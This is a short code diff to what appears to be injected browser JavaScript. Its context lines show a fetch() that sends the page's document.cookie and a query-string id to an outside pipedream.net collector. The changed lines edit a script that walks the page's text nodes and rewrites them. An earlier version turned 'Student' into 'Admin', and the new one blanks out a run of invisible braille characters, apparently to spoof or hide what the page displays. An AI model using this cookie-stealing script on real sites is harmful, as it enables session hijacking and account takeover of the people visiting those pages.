@@ -16,7 +16,7 @@ fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.qu
   }
 })();
 (() => {
-  const target = `Student`;
+  const target = `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`;
 
   const walker = document.createTreeWalker(
     document.body,
@@ -27,7 +27,7 @@ fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.qu
   let node;
   while ((node = walker.nextNode())) {
     if (node.nodeValue.includes(target)) {
-      node.nodeValue = node.nodeValue.replace(target, 'Admin');
+      node.nodeValue = node.nodeValue.replace(target, '');
     }
   }
 })();
